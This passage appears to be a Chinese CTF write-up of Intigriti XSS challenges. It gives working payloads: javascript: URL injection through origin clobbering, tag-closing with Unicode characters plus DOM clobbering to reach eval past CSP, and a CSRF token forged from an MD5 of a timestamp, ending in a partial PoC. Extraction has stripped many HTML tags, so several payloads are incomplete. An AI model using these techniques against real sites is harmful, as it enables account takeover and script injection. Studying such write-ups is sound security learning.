我注意到本题的要求“通过`alert()`弹出 {THIS_IS_THE_FLAG}”“在这个页面实现XSS”
，而不像其他题目需要执行“`alert(document.domian)`或者`alert(origin)`”“在域名challenge.intigriti.io在实现XSS”，那么有可能通过本挑战一个特定的子域名`*.challenge-0121.intigriti.io`来控制`window.origin`的值，从而达到控制`window.location`
的目的。
通过Sublist3r工具进行寻找，发现了子域名:`javascript.challenge-0121.intigriti.io`的`window.origin`没有被定义：
`https://javascript.challenge-0121.intigriti.io/?r=aaaaaa`被重定向到`https://javascript.challenge-0121.intigriti.io/undefined/aaaaaa`：
如此一来，结合前面的可控的嵌入的html标签，即可控制`window.origin`的值。构造`r=aaa%0aid=origin`：
进一步构造`r=https://attack.com%0aid=origin`，可以看到：
并且被重定向到attack的地址：
利用大小写可以绕过“`javastript`
不能出现在`r`参数中”的限制，因此，我们可以构造payload：`r=jAvascript:alert(1)/%0aid=origin`，即可执行xss:
为了弹出 {THIS_IS_THE_FLAG}，由于`` `"` `'` `(空格)` 不能出现在`r`参数中，可以使用
`号；或者使用`flag.innerHTML`。
###  POC
最终的payload:
    https://javascript.challenge-0121.intigriti.io/?r=jAvascript:alert(flag.innerHTML)/%0aid=origin
    https://javascript.challenge-0121.intigriti.io/?r=jAvascript:alert(`{THIS_IS_THE_FLAG}`)/%0aid=origin
## 0x03 xss challenge 0221
###  题目概述
地址：  
该挑战是根据真实漏洞场景改编而来，挑战有以下要求：
  * 触发`alert(origin)`
  * 绕过CSP限制
  * 不需要用户交互
  * 使用最新版的Firefox或者Chrome浏览器
  * 利用此页面的xss漏洞
  * 不允许self-XSS 和 MiTM 攻击
###  思路分析
首先分析网页功能，随便输入一些字符串：
可以看到网页反馈提示收到提交信息，并可以生成一个`share link`。点击`share link`，浏览器地址栏生成带有参数的地址如下：
    https://challenge-0221.intigriti.io/?assignmentTitle=aaaaaaaaaaaa&assignmentText=aaaaaaaaaaaaaaaaa...
由此可以判定，可以利用参数值构造payload形成xss。
检查网页源码，发现`script.js`:
    function startGrade() {
      var text = document.getElementById("assignmentText").value;
      checkLength(text);
      result = window.result || {
        message: "Your submission is too short.",
        error: 1,
      }; //If the result object hasn't been defined yet, the submission must be too short
      if (result.error) {
        endGrade();
      } else {
        getQAnswer();
        if (!passQuiz()) {
          result.message = "We don't allow robots at the Unicodeversity (yet)!";
          result.error = 1;
        } else {
          result.grade = "ABCDEF"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions
        }
        endGrade();
      }
    }
    function endGrade() {
      document.getElementById("message").innerText = result.message;
      if (result.grade) {
        document.getElementById(
          "grade"
        ).innerText = `You got a(n) ${result.grade}!`;
      }
      document.getElementById("share").style.visibility = "initial";
      document.getElementById(
        "share-link"
      ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=${
        document.getElementById("assignmentTitle").value
      }&assignmentText=${document.getElementById("assignmentText").value}`;
      delete result;
    }
    function checkLength(text) {
      if (text.length > 50) {
        result = { message: "Thanks for your submission!" };
      }
    }
    function getQAnswer() {
      var answer = document.getElementById("answer").value;
      if (/^[0-9]+$/.test(answer)) {
        if (typeof result !== "undefined") {
          result.questionAnswer = { value: answer };
        } else {
          result = { questionAnswer: { value: answer } };
        }
      }
    }
    function passQuiz() {
      if (typeof result.questionAnswer !== "undefined") {
        return eval(result.questionAnswer.value + " == " + question);
      }
      return false;
    }
    var question = `${Math.floor(Math.random() * 10) + 1} + ${
      Math.floor(Math.random() * 10) + 1
    }`;
    document.getElementById("question").innerText = `${question} = ?`;
    document.getElementById("submit").addEventListener("click", startGrade);
    const urlParams = new URLSearchParams(location.search);
    if (urlParams.has("autosubmit")) {
      startGrade();
    }
对`script.js`进行分析，发现几个有意思的点。一是`passQuiz`函数中存在`eval`方法，可能会被用来执行我们的js payload:
其中`result.questionAnswer.value`由`getAnswer`函数获得，但对`answer`参数进行了限制，只能是数字。
第二个点是，url中可以包含`autosubmit`参数，可以用来满足题目中”不需要用户交互”的要求：
从页面的提示，该挑战涉及到 Unicode编码:
> Welcome to the Unicodeversity’s Well-trusted Assignment Computer Knowledge
> system, where we primarily focus on your ability to use cool Unicode and not
> so much on the content of your submissions
尝试输入特殊的Unicode字符`π`(`U+03C0`)。当直接在输入框中输时，页面不允许：
直接在url中输入，可以看到页面显示如下：
其中`(特殊方框)`+`c0`引起了我的注意。通过查询`(特殊方框)`可知它为`U+0003`：
以此为例，通过其他Unicode字符测试可以判定，当我们输入一个特定的Unicode字符形如 U+abcd 时，会被解析为`U+00ab`+`cd`。
由于输入在``标签中，我们需要对标签进行闭合，构造xss
payload。首先的思路是尝试通过`"`对`value=`进行闭合，并添加事件属性`onmouseover=alert(1)`。依照次思路，我们需要按照页面解析Unicode字符的规律进行构造payload。
    " —— U+0022
    ∢ —— U+2222
因为`"`的Unicode编码为`U+0022`，则`∢( U+2222)`会被解析为`"+22`，从而成功闭合：
构造payload `∢ onmouseover=alert(1)&autosubmit` 没有被执行，发现被CSP拦截：
此路不通，需要换个角度执行js。页面允许`script.js`执行，可以用来绕过CSP。通过上面对`script.js`的分析，我们可以利用`eval`方法执行payload。那么现在的问题就变成了，如何操控`result.questionAnswer.value`。从上面的分析可以知道，想绕过`getAnswer`函数的限制是不可能的。通过分析`result`并没有定义：
所以我们可以自己定义`result`进而操控最终的`result.questionAnswer.value`。  
首先通过直接修改页面Html验证可行性。如果我们在页面中插入``，则能定位到`result`:
为了能进一步定位到`queationAnswer`，构造新的标签``，并使得`value=alert(1)`:
这时，当`eval(result.questionAnswer.value + " == " +
question);`语句被执行时，我们已经将`result.questionAnswer.value`的值覆盖为`alert(1)`，便可成功弹窗：
以上思路的可行性验证完毕，需要构造如下payload，首先对原始的`input`标签进行闭合，然后插入新的标签：
    ">
寻找特殊的Unicode字符：
    " —— U+0022    ∢ —— U+2222   ===>  "22
    > —— U+003E    㺪 —— U+3EAA   ===>  >aa
      `标签满足需求：
###  POC
构造以``为基础的有效payload：
    ">
需要的特殊Unicode字符为：
    㳚 —— U+3EDA + 'ta'  ===>   
此外，经过大量的字符测试，发现网页有一个特殊的特性。例如我们输入`ftp://attack.com`或者`http://attack.com`这类带有协议名的特殊输入并保存，网页会生成一个特定的``标签：
这样我们便有了一个可控的标签，输入一些特殊字符尝试构造闭合，发现网页对`'`
`"`等特殊字符进行了过滤，进行了截断，无法与包含协议名的payload构造为一个整体形成构造闭合：
通过将更改POST数据中`csrf` `notes`的类型（加上`[]` ，这是曾经做CTF题型时学习到的一个思路），可以看到一些有趣的信息：
这里发现对于`notes`的输入是由PHP`htmlspecialchars()`过滤的，这里查询了相关资料，并进行了字符集的测试，发现了类似于邮箱的地址`[PI:EMAIL](mailto:PI:EMAIL)`可以被成功输入，并且也能使网页自动添加`` ：
通过[RFC2822](https://tools.ietf.org/html/rfc2822)
可以知道，邮箱名中可以包含很多特殊的字符，例如`"xss"[@attack](https://github.com/attack
"@attack").com`依然可以被认定为一个合法的邮箱地址，并能够构造闭合，让我们控制标签内容：
构造payload：`"onclick=alert(1);"[@attack](https://github.com/attack
"@attack").com`，即可实现self-xss:
由于题目不允许self-xss，所以我们需要从绕过csrf的角度入手，实现无需交互的xss。如果csrf令牌不正确，则会显示403：
我们知道csrf令牌都是动态生成的，通常情况下该令牌可以由时间戳的加密哈希或者一些随机输入的加密哈希生成。这里我们坚持页面源码注意到包含页面的生成时间：
    ...
    ...
经过测试将日期转为时间戳并通过MD5加密，得到了相同的结果，由此，便可以绕过csrf的限制：
现在，我们需要能够进行MD5加密的JS，可以从以下地址获得：
    # CryptoJS.MD5()
    https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js
    https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js
为了保证我们生成的csrf令牌与网页自动生成的一直，需要查看攻击服务器的时间戳与题目网页时间戳之间的误差：
可以看到两个时间戳之间存在8小时时差，通过调整，可以使攻击服务器生成了csrf令牌与网页生成的令牌一致：
###  POC
综合上面的思路，可以构造以下poc：
        xss
            var ts0 = Date.parse(new Date());
            var ts1 = String(ts0).substring(0,10);
            var passhash = CryptoJS.MD5(ts1).toString();
            function add0(m){return m